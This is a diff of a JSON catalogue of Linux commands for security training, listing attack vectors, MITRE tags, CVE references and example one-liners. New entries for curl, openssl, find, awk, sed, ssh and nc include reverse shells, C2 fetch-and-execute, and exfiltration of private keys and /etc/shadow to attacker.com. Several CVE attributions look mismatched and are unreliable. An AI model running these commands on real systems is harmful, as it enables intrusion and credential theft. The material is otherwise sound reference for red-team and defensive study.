-      "video_url": "https://www.youtube.com/watch?v=Jc5orEuQRBI"
+      "video_url": "https://www.youtube.com/watch?v=Jc5orEuQRBI",
+      "extra": false
     },
     {
       "id": "HGh2drplJwY",
@@ -2332,8 +2729,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=HGh2drplJwY"
+      "video_url": "https://www.youtube.com/watch?v=HGh2drplJwY",
+      "extra": false
     },
     {
       "id": "zCXkKX2MMGc",
@@ -2378,8 +2779,15 @@
           "note": "Compare hash sets order-independently — find changed/added/removed files"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "forensics",
+        "linux"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=zCXkKX2MMGc"
+      "video_url": "https://www.youtube.com/watch?v=zCXkKX2MMGc",
+      "extra": false
     },
     {
       "id": "TQ5S6-6PD2k",
@@ -2402,8 +2810,15 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [
+        "linux",
+        "forensics"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=TQ5S6-6PD2k"
+      "video_url": "https://www.youtube.com/watch?v=TQ5S6-6PD2k",
+      "extra": false
     },
     {
       "id": "YCtu7PI3obA",
@@ -2450,8 +2865,15 @@
           "note": "Extract and exfiltrate only crackable hashes"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "forensics",
+        "linux"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=YCtu7PI3obA"
+      "video_url": "https://www.youtube.com/watch?v=YCtu7PI3obA",
+      "extra": false
     },
     {
       "id": "VhDjypuEsjY",
@@ -2492,8 +2914,14 @@
           "note": "Persistent + unbuffered: combine for a well-behaved background implant"
         }
       ],
+      "cve_refs": [
+        "CVE-2021-3326 (iconv glibc — stdbuf output manipulation)"
+      ],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=VhDjypuEsjY"
+      "video_url": "https://www.youtube.com/watch?v=VhDjypuEsjY",
+      "extra": false
     },
     {
       "id": "YGNLLS3UB3k",
@@ -2534,8 +2962,12 @@
           "note": "Split log on event boundaries then grep each segment — fine-grained log analysis"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=YGNLLS3UB3k"
+      "video_url": "https://www.youtube.com/watch?v=YGNLLS3UB3k",
+      "extra": false
     },
     {
       "id": "j95yzoRGxWc",
@@ -2589,8 +3021,20 @@
           "note": "Inspect MBR — first 512 bytes show bootloader and partition table"
         }
       ],
+      "cve_refs": [
+        "CVE-2019-14869 (raw device read privilege escalation)"
+      ],
+      "ctf_categories": [
+        "forensics",
+        "pwn"
+      ],
+      "root_vs_user": {
+        "root": "Can read raw block devices: `dd if=/dev/sda of=disk.img` — full disk clone, bypasses filesystem",
+        "user": "Restricted to files within own permissions — cannot read /dev/sda or /dev/mem"
+      },
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=j95yzoRGxWc"
+      "video_url": "https://www.youtube.com/watch?v=j95yzoRGxWc",
+      "extra": false
     },
     {
       "id": "dN1uOPydCO4",
@@ -2612,8 +3056,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=dN1uOPydCO4"
+      "video_url": "https://www.youtube.com/watch?v=dN1uOPydCO4",
+      "extra": false
     },
     {
       "id": "fT-ASLgHVKo",
@@ -2633,8 +3081,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=fT-ASLgHVKo"
+      "video_url": "https://www.youtube.com/watch?v=fT-ASLgHVKo",
+      "extra": false
     },
     {
       "id": "x47s05sVNr8",
@@ -2671,8 +3123,12 @@
           "note": "Find files present now but not in the hash baseline — newly added binaries"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=x47s05sVNr8"
+      "video_url": "https://www.youtube.com/watch?v=x47s05sVNr8",
+      "extra": false
     },
     {
       "id": "lTOje2weu_o",
@@ -2726,8 +3182,15 @@
           "note": "Map hosts file to live IPs — quick internal network discovery"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "linux",
+        "forensics"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=lTOje2weu_o"
+      "video_url": "https://www.youtube.com/watch?v=lTOje2weu_o",
+      "extra": false
     },
     {
       "id": "Rot-_Vwhu1Y",
@@ -2747,8 +3210,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=Rot-_Vwhu1Y"
+      "video_url": "https://www.youtube.com/watch?v=Rot-_Vwhu1Y",
+      "extra": false
     },
     {
       "id": "kjqLp7OOzLI",
@@ -2768,8 +3235,15 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [
+        "forensics",
+        "linux"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=kjqLp7OOzLI"
+      "video_url": "https://www.youtube.com/watch?v=kjqLp7OOzLI",
+      "extra": false
     },
     {
       "id": "bgPAXvnparo",
@@ -2789,8 +3263,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=bgPAXvnparo"
+      "video_url": "https://www.youtube.com/watch?v=bgPAXvnparo",
+      "extra": false
     },
     {
       "id": "MLWCmQJ9dfg",
@@ -2812,8 +3290,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=MLWCmQJ9dfg"
+      "video_url": "https://www.youtube.com/watch?v=MLWCmQJ9dfg",
+      "extra": false
     },
     {
       "id": "9caYkuU06Cw",
@@ -2860,8 +3342,20 @@
           "note": "When shred is unavailable, dd with /dev/zero achieves similar effect"
         }
       ],
+      "cve_refs": [
+        "CVE-2020-16092 (QEMU evidence wiping via shred in chain)"
+      ],
+      "ctf_categories": [
+        "forensics",
+        "linux"
+      ],
+      "root_vs_user": {
+        "root": "Can shred raw devices (`shred /dev/sda`) — destroys entire disk; can shred protected logs",
+        "user": "Limited to own files; cannot shred /var/log/auth.log without sudo"
+      },
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=9caYkuU06Cw"
+      "video_url": "https://www.youtube.com/watch?v=9caYkuU06Cw",
+      "extra": false
     },
     {
       "id": "7DdEFSrvYv0",
@@ -2915,8 +3409,17 @@
           "note": "/dev/shm is memory-only, survives as long as system is up, leaves no disk artifact"
         }
       ],
+      "cve_refs": [
+        "CVE-2014-6278 (Shellshock variant via echo in CGI)"
+      ],
+      "ctf_categories": [
+        "linux",
+        "web"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=7DdEFSrvYv0"
+      "video_url": "https://www.youtube.com/watch?v=7DdEFSrvYv0",
+      "extra": false
     },
     {
       "id": "QUIWbXYTp4Y",
@@ -2962,8 +3465,20 @@
           "note": "Audit permissions on critical files — check against known-good values"
         }
       ],
+      "cve_refs": [
+        "CVE-2021-3156 (sudo heap overflow — SUID exploitation chain)"
+      ],
+      "ctf_categories": [
+        "linux",
+        "pwn"
+      ],
+      "root_vs_user": {
+        "root": "Can set SUID/SGID bits (`chmod u+s /bin/bash`) and change permissions on any file",
+        "user": "Can only change permissions on files owned by current user; cannot set SUID on root-owned files"
+      },
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=QUIWbXYTp4Y"
+      "video_url": "https://www.youtube.com/watch?v=QUIWbXYTp4Y",
+      "extra": false
     },
     {
       "id": "knykP_7rS6s",
@@ -3003,8 +3518,12 @@
           "note": "Build a full system fingerprint file for offline analysis"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=knykP_7rS6s"
+      "video_url": "https://www.youtube.com/watch?v=knykP_7rS6s",
+      "extra": false
     },
     {
       "id": "Z0-u5lmy7wo",
@@ -3042,8 +3561,15 @@
           "note": "Low uptime + unknown users = suspicious reboot + re-entry"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "linux",
+        "recon"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=Z0-u5lmy7wo"
+      "video_url": "https://www.youtube.com/watch?v=Z0-u5lmy7wo",
+      "extra": false
     },
     {
       "id": "sCm0jez-Pko",
@@ -3068,8 +3594,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=sCm0jez-Pko"
+      "video_url": "https://www.youtube.com/watch?v=sCm0jez-Pko",
+      "extra": false
     },
     {
       "id": "2fCzfhj0PiQ",
@@ -3091,8 +3621,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=2fCzfhj0PiQ"
+      "video_url": "https://www.youtube.com/watch?v=2fCzfhj0PiQ",
+      "extra": false
     },
     {
       "id": "YBZWdeu-g8M",
@@ -3139,8 +3673,15 @@
           "note": "faketime (external tool) alters time for a specific process — bypasses time-based license checks and log timestamps"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "linux",
+        "crypto"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=YBZWdeu-g8M"
+      "video_url": "https://www.youtube.com/watch?v=YBZWdeu-g8M",
+      "extra": false
     },
     {
       "id": "nkTp3Ew5GMw",
@@ -3166,8 +3707,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=nkTp3Ew5GMw"
+      "video_url": "https://www.youtube.com/watch?v=nkTp3Ew5GMw",
+      "extra": false
     },
     {
       "id": "hhvCUuyKdzg",
@@ -3189,8 +3734,15 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [
+        "crypto",
+        "forensics"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=hhvCUuyKdzg"
+      "video_url": "https://www.youtube.com/watch?v=hhvCUuyKdzg",
+      "extra": false
     },
     {
       "id": "M3iyVQ4nq_Q",
@@ -3228,8 +3780,15 @@
           "note": "Resolve all paths in /tmp — catches anything that escaped the directory"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "linux",
+        "forensics"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=M3iyVQ4nq_Q"
+      "video_url": "https://www.youtube.com/watch?v=M3iyVQ4nq_Q",
+      "extra": false
     },
     {
       "id": "XMH3Jv2pGZc",
@@ -3269,8 +3828,15 @@
           "note": "Randomized password brute-force — slower but avoids lockout-by-sequence"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "crypto",
+        "linux"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=XMH3Jv2pGZc"
+      "video_url": "https://www.youtube.com/watch?v=XMH3Jv2pGZc",
+      "extra": false
     },
     {
       "id": "xl8zXcPJTvg",
@@ -3312,8 +3878,15 @@
           "note": "Lowercase base32 — same encoding, different character class, defeats case-sensitive signatures"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "crypto",
+        "forensics"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=xl8zXcPJTvg"
+      "video_url": "https://www.youtube.com/watch?v=xl8zXcPJTvg",
+      "extra": false
     },
     {
       "id": "_A0W7gYEgJg",
@@ -3335,8 +3908,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=_A0W7gYEgJg"
+      "video_url": "https://www.youtube.com/watch?v=_A0W7gYEgJg",
+      "extra": false
     },
     {
       "id": "xAf83lFBcTw",
@@ -3383,8 +3960,15 @@
           "note": "Hard link SUID trick: if original loses SUID, hard link may retain it depending on kernel"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "linux",
+        "pwn"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=xAf83lFBcTw"
+      "video_url": "https://www.youtube.com/watch?v=xAf83lFBcTw",
+      "extra": false
     },
     {
       "id": "JFEkgZWCPrI",
@@ -3404,8 +3988,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=JFEkgZWCPrI"
+      "video_url": "https://www.youtube.com/watch?v=JFEkgZWCPrI",
+      "extra": false
     },
     {
       "id": "DwwLddE7kUU",
@@ -3453,8 +4041,1037 @@
           "note": "Auto-clear on every write — persistent log suppression (blue: detect this pattern)"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=DwwLddE7kUU"
+      "video_url": "https://www.youtube.com/watch?v=DwwLddE7kUU",
+      "extra": false
+    },
+    {
+      "id": "extra_nmap",
+      "title": "The 'nmap' Command In Linux",
+      "command": "nmap",
+      "hat": "red",
+      "security_intent": "The standard network scanner. Maps open ports, services, OS fingerprints, and runs NSE scripts. Core recon tool in every pentest — determines the attack surface before exploitation.",
+      "attack_vectors": [
+        "port scanning",
+        "service enumeration",
+        "OS fingerprinting",
+        "vulnerability scanning via NSE",
+        "firewall evasion via fragmentation"
+      ],
+      "defense_use": "Internal network audits, exposed service discovery, continuous monitoring with scheduled scans.",
+      "mitre_tags": [
+        "T1046",
+        "T1595.001",
+        "T1595.002"
+      ],
+      "threat_level": 3,
+      "related_commands": [
+        "nc",
+        "curl",
+        "ssh",
+        "tcpdump"
+      ],
+      "quick_use": [
+        "nmap -sV -p- 10.0.0.1                  # full port scan with service versions",
+        "nmap -sC -sV -O 10.0.0.1               # default scripts + OS detection",
+        "nmap -sn 10.0.0.0/24                   # ping sweep — find live hosts",
+        "nmap -p 22,80,443 --open 10.0.0.0/24   # scan subnet for specific ports",
+        "nmap -sU -p 53,161,500 10.0.0.1        # UDP scan (slower — use targeted)"
+      ],
+      "combinations": [
+        {
+          "with": "grep",
+          "example": "nmap -sV 10.0.0.1 | grep 'open'",
+          "note": "Filter to only open ports"
+        },
+        {
+          "with": "nc",
+          "example": "nmap -p- 10.0.0.1 --open | grep '/tcp' | awk -F/ '{print $1}' | xargs -I{} nc -zv 10.0.0.1 {}",
+          "note": "Verify open ports with netcat"
+        },
+        {
+          "with": "curl",
+          "example": "nmap -p 80,443,8080,8443 --open 10.0.0.0/24 -oG - | awk '/open/{print $2}' | xargs -I{} curl -sk http://{}",
+          "note": "Auto-probe discovered HTTP services"
+        }
+      ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "network",
+        "recon"
+      ],
+      "root_vs_user": {
+        "root": "SYN scan (-sS) available — faster and stealthier than full TCP connect; raw socket access enables OS detection",
+        "user": "Falls back to TCP connect scan (-sT) — creates full connections, more detectable and slower"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_curl",
+      "title": "The 'curl' Command In Linux",
+      "command": "curl",
+      "hat": "red",
+      "security_intent": "HTTP/HTTPS client and data transfer tool. Used for web recon, API fuzzing, file exfiltration, and payload delivery. Its ability to follow redirects, handle cookies, and speak dozens of protocols makes it a universal attack utility.",
+      "attack_vectors": [
+        "SSRF testing",
+        "file exfiltration via HTTP POST",
+        "C2 beacon over HTTPS",
+        "credential stuffing",
+        "web shell interaction"
+      ],
+      "defense_use": "Health checks, webhook testing, API monitoring, certificate validation.",
+      "mitre_tags": [
+        "T1071.001",
+        "T1105",
+        "T1567"
+      ],
+      "threat_level": 3,
+      "related_commands": [
+        "wget",
+        "nc",
+        "openssl",
+        "python3"
+      ],
+      "quick_use": [
+        "curl -sk https://10.0.0.1/               # HTTPS ignoring cert errors",
+        "curl -X POST -d @file.txt http://10.0.0.1/upload  # POST file contents",
+        "curl -H 'Authorization: Bearer TOKEN' https://api.target.com/admin",
+        "curl --proxy http://127.0.0.1:8080 http://target.com  # route through Burp",
+        "curl -s http://169.254.169.254/latest/meta-data/  # AWS IMDS SSRF test"
+      ],
+      "combinations": [
+        {
+          "with": "python3",
+          "example": "python3 -c 'import http.server; ...' & curl http://localhost:8000/secret",
+          "note": "Quick local HTTP server for file exchange"
+        },
+        {
+          "with": "base64",
+          "example": "curl -s http://c2.attacker.com/cmd | base64 -d | bash",
+          "note": "Decode and execute base64 payload from C2"
+        },
+        {
+          "with": "openssl",
+          "example": "curl --cacert server.crt https://internal.corp/secret",
+          "note": "Trust custom CA for internal HTTPS"
+        }
+      ],
+      "cve_refs": [
+        "CVE-2023-38545 (SOCKS5 heap overflow)",
+        "CVE-2022-27774 (credentials leakage on redirect)"
+      ],
+      "ctf_categories": [
+        "web",
+        "network"
+      ],
+      "root_vs_user": {
+        "root": "Can write output to system paths; access to root's .netrc for auto-credentials",
+        "user": "Normal HTTP client; output restricted to writable paths"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_ssh",
+      "title": "The 'ssh' Command In Linux",
+      "command": "ssh",
+      "hat": "red",
+      "security_intent": "Encrypted remote shell and tunneling protocol. Beyond remote access, SSH is a full pivot platform: port forwarding, SOCKS proxying, X11 forwarding, and agent forwarding enable deep network traversal once a single host is compromised.",
+      "attack_vectors": [
+        "lateral movement",
+        "port forwarding / pivoting",
+        "SOCKS proxy via -D",
+        "agent hijacking via SSH_AUTH_SOCK",
+        "credential harvesting from known_hosts"
+      ],
+      "defense_use": "Secure remote administration, bastion host access, encrypted tunnel for insecure protocols.",
+      "mitre_tags": [
+        "T1021.004",
+        "T1572",
+        "T1090.002",
+        "T1552.004"
+      ],
+      "threat_level": 4,
+      "related_commands": [
+        "nc",
+        "socat",
+        "find",
+        "chmod"
+      ],
+      "quick_use": [
+        "ssh -L 8080:internal.host:80 user@jumphost  # local port forward",
+        "ssh -R 4444:127.0.0.1:4444 user@attacker   # reverse tunnel to attacker",
+        "ssh -D 1080 user@pivot                      # SOCKS proxy via pivot",
+        "ssh -N -f -L 5432:db.internal:5432 user@fw # background forward to DB",
+        "ssh-keygen -t ed25519 && cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys"
+      ],
+      "combinations": [
+        {
+          "with": "nc",
+          "example": "ssh -o ProxyCommand='nc -X 5 -x 127.0.0.1:1080 %h %p' user@deep.internal",
+          "note": "Chain SSH through SOCKS proxy"
+        },
+        {
+          "with": "find",
+          "example": "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null | xargs -I{} cp {} /tmp/.loot/",
+          "note": "Harvest private keys for SSH lateral movement"
+        },
+        {
+          "with": "curl",
+          "example": "curl --socks5 127.0.0.1:1080 http://internal.corp/admin",
+          "note": "Access internal services via SSH SOCKS proxy"
+        }
+      ],
+      "cve_refs": [
+        "CVE-2023-38408 (OpenSSH forwarded agent code exec)",
+        "CVE-2021-41617 (privilege separation weakness)"
+      ],
+      "ctf_categories": [
+        "network",
+        "linux"
+      ],
+      "root_vs_user": {
+        "root": "Can bind port forwards on privileged ports (<1024); `ssh -L 443:...` for HTTPS impersonation",
+        "user": "Port forwarding restricted to >= 1024; agent forwarding works regardless of privilege"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_openssl",
+      "title": "The 'openssl' Command In Linux",
+      "command": "openssl",
+      "hat": "red",
+      "security_intent": "Swiss army knife for cryptographic operations and certificate handling. Attackers use it to inspect TLS configurations, generate self-signed certs for C2 infrastructure, test Heartbleed-style vulns, and create encrypted reverse shells.",
+      "attack_vectors": [
+        "TLS inspection/stripping",
+        "certificate forgery",
+        "encrypted reverse shell channel",
+        "padding oracle attacks",
+        "Heartbleed exploitation (CVE-2014-0160)"
+      ],
+      "defense_use": "Certificate management, TLS configuration testing, key generation, file encryption.",
+      "mitre_tags": [
+        "T1573.001",
+        "T1071.001",
+        "T1040"
+      ],
+      "threat_level": 3,
+      "related_commands": [
+        "nc",
+        "curl",
+        "ssh",
+        "base64"
+      ],
+      "quick_use": [
+        "openssl s_client -connect target.com:443    # inspect TLS cert + chain",
+        "openssl req -x509 -newkey rsa:4096 -keyout k.pem -out c.pem -days 365 -nodes",
+        "openssl enc -aes-256-cbc -salt -in file -out file.enc -k password",
+        "openssl enc -d -aes-256-cbc -in file.enc -out file -k password",
+        "openssl x509 -in cert.pem -text -noout     # read certificate details"
+      ],
+      "combinations": [
+        {
+          "with": "nc",
+          "example": "openssl s_client -quiet -connect attacker.com:443 | /bin/bash | openssl s_client -quiet -connect attacker.com:444",
+          "note": "Encrypted reverse shell — bypasses plaintext DPI"
+        },
+        {
+          "with": "base64",
+          "example": "openssl rand -base64 32                           # generate strong random password/key",
+          "note": "Cryptographically secure random key material"
+        },
+        {
+          "with": "curl",
+          "example": "curl --cacert <(openssl s_client -connect host:443 </dev/null 2>/dev/null | openssl x509) https://host/",
+          "note": "Trust-on-first-use style cert pinning"
+        }
+      ],
+      "cve_refs": [
+        "CVE-2014-0160 (Heartbleed — OpenSSL memory disclosure)",
+        "CVE-2022-0778 (infinite loop in BN_mod_sqrt)"
+      ],
+      "ctf_categories": [
+        "crypto",
+        "web",
+        "network"
+      ],
+      "root_vs_user": {
+        "root": "Can write certs to /etc/ssl/; bind encrypted listeners on port 443",
+        "user": "Full crypto operations work as user; listener ports restricted to >= 1024"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_find",
+      "title": "The 'find' Command In Linux",
+      "command": "find",
+      "hat": "red",
+      "security_intent": "Filesystem traversal with exec capability. Attackers use it to locate credentials, SUID binaries, writable directories, and recently modified files. Its -exec flag turns it into a code execution primitive. Core GTFOBins tool.",
+      "attack_vectors": [
+        "SUID binary discovery",
+        "credential file hunting",
+        "writable path discovery",
+        "GTFOBins shell escape",
+        "recently modified file detection"
+      ],
+      "defense_use": "Audit SUID binaries, find world-writable files, locate sensitive files for permission hardening.",
+      "mitre_tags": [
+        "T1083",
+        "T1548.001",
+        "T1059.004"
+      ],
+      "threat_level": 3,
+      "related_commands": [
+        "chmod",
+        "grep",
+        "xargs",
+        "ls"
+      ],
+      "quick_use": [
+        "find / -perm -4000 -type f 2>/dev/null    # find all SUID binaries",
+        "find / -writable -type d 2>/dev/null       # find writable directories",
+        "find / -name '*.conf' -o -name '*.env' -o -name '.htpasswd' 2>/dev/null",
+        "find / -mmin -10 2>/dev/null               # files modified in last 10 min",
+        "find / -nouser -o -nogroup 2>/dev/null     # orphaned files (sign of cleanup)"
+      ],
+      "combinations": [
+        {
+          "with": "grep",
+          "example": "find /var/www -name '*.php' -exec grep -l 'eval\\|base64_decode\\|system(' {} \\;",
+          "note": "Hunt web shells across PHP files"
+        },
+        {
+          "with": "xargs",
+          "example": "find / -perm -4000 2>/dev/null | xargs ls -la",
+          "note": "List all SUID binaries with details"
+        },
+        {
+          "with": "nc",
+          "example": "find / -name id_rsa 2>/dev/null -exec cat {} \\; | nc attacker.com 4444",
+          "note": "Exfiltrate all found private keys"
+        }
+      ],
+      "cve_refs": [
+        "CVE-2021-4034 (pkexec SUID via traversal pattern)"
+      ],
+      "ctf_categories": [
+        "linux",
+        "forensics"
+      ],
+      "root_vs_user": {
+        "root": "No permission errors — traverses entire filesystem including /root, /proc/*/mem; -exec runs as root",
+        "user": "Permission denied on unreadable dirs; still finds SUID binaries in accessible paths"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_awk",
+      "title": "The 'awk' Command In Linux",
+      "command": "awk",
+      "hat": "red",
+      "security_intent": "Stream processor and de facto report language for UNIX. In security contexts it parses log files, extracts credentials from dumps, formats exploit output, and via sudo misconfiguration is a full shell escape (GTFOBins).",
+      "attack_vectors": [
+        "log parsing for credential extraction",
+        "data exfiltration formatting",
+        "GTFOBins shell escape via sudo awk",
+        "payload staging via awk print"
+      ],
+      "defense_use": "Log analysis, extracting IOCs from large text dumps, custom alert formatting.",
+      "mitre_tags": [
+        "T1059.004",
+        "T1552.001",
+        "T1083"
+      ],
+      "threat_level": 2,
+      "related_commands": [
+        "sed",
+        "grep",
+        "cut",
+        "sort"
+      ],
+      "quick_use": [
+        "awk -F: '{print $1,$3}' /etc/passwd       # extract username and UID",
+        "awk '{print $NF}' file                    # print last field of each line",
+        "awk '/error|fail/i {print NR\": \"$0}' log.txt  # grep with line numbers",
+        "awk 'length > 100' file                   # lines longer than 100 chars",
+        "awk 'NR==2,NR==10' file                   # print lines 2-10"
+      ],
+      "combinations": [
+        {
+          "with": "nc",
+          "example": "awk 'BEGIN{s=\"/inet/tcp/0/10.0.0.1/4444\";while(1){print \"$ \" |& s;s |& getline c;if(c){print c;while((c |& getline)>0)print|&s;close(c)}}}' /dev/null",
+          "note": "Pure awk reverse shell — no nc needed"
+        },
+        {
+          "with": "grep",
+          "example": "grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head",
+          "note": "Brute-force IP summary from auth log"
+        },
+        {
+          "with": "sort",
+          "example": "awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20",
+          "note": "Top 20 IPs from web access log"
+        }
+      ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "forensics",
+        "linux",
+        "scripting"
+      ],
+      "root_vs_user": {
+        "root": "Can read /etc/shadow and other root-only files directly in awk; `sudo awk` is a GTFOBins shell",
+        "user": "Read access limited to permitted files; `awk 'BEGIN{system(\"/bin/sh\")}' works if awk is in sudoers"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_sed",
+      "title": "The 'sed' Command In Linux",
+      "command": "sed",
+      "hat": "red",
+      "security_intent": "Stream editor for in-place file modification. A GTFOBins tool — if sudo-permitted, `sed -n '/.*/{p;q}' /etc/shadow` leaks any file. Attackers use it to patch binaries, modify /etc/passwd, and strip IDS signatures from payloads.",
+      "attack_vectors": [
+        "in-place file modification",
+        "GTFOBins shell escape via sudo sed",
+        "credential file modification",
+        "payload signature stripping"
+      ],
+      "defense_use": "Config file patching, log sanitization, mass string replacement in code.",
+      "mitre_tags": [
+        "T1059.004",
+        "T1552.001",
+        "T1070.003"
+      ],
+      "threat_level": 2,
+      "related_commands": [
+        "awk",
+        "grep",
+        "tr",
+        "cut"
+      ],
+      "quick_use": [
+        "sed -i 's/old/new/g' file.txt             # in-place global replace",
+        "sed -n '10,20p' file                      # print lines 10-20",
+        "sed '/pattern/d' file                     # delete lines matching pattern",
+        "sed 's/password=.*/password=REDACTED/' log.txt  # scrub passwords from log",
+        "sed -i '/^#/d; /^$/d' config.conf        # strip comments and blank lines"
+      ],
+      "combinations": [
+        {
+          "with": "find",
+          "example": "find /var/www -name '*.php' | xargs sed -i 's/eval(base64_decode/\\/\\/ BLOCKED: eval(base64_decode/g'",
+          "note": "Patch web shells across all PHP files"
+        },
+        {
+          "with": "awk",
+          "example": "awk -F: '{print $1\":x:\"$3\":\"$4\":\"$5\":\"$6\":/bin/nologin\"}' /etc/passwd | sed 's/root:x:0:0/root:x:0:0/' > /etc/passwd.new",
+          "note": "Disable shells for all non-root users"
+        },
+        {
+          "with": "nc",
+          "example": "sed -n 'p' /etc/shadow | nc attacker.com 4444",
+          "note": "Exfiltrate shadow file if readable"
+        }
+      ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "forensics",
+        "linux",
+        "scripting"
+      ],
+      "root_vs_user": {
+        "root": "Can edit /etc/passwd, /etc/shadow in-place; strip evidence from protected logs",
+        "user": "In-place edit only on own files; read-only on protected system files"
+      },
+      "transcript": "",
+      "video_url": "",
+      "extra": true
+    },
+    {
+      "id": "extra_nc",
+      "title": "The 'nc' Command In Linux",
+      "command": "nc",
+      "hat": "black",
+      "security_intent": "Netcat — the TCP/UDP Swiss army knife. Attackers use it for reverse shells, port forwarding, file transfer, port scanning, and as a generic network debugging tool. Rarely legitimate on production servers.",
+      "attack_vectors": [
+        "reverse shell listener",
+        "bind shell",
+        "file exfiltration over TCP",
+        "port relay / pivoting",
+        "banner grabbing"
+      ],
+      "defense_use": "Network debugging, testing firewall rules, checking port availability.",
+      "mitre_tags": [
+        "T1059.004",
+        "T1071.001",
+        "T1048",
+        "T1090"
+      ],
+      "threat_level": 5,
+      "related_commands": [
+        "mkfifo",
+        "bash",
+        "socat",
+        "nmap"
+      ],
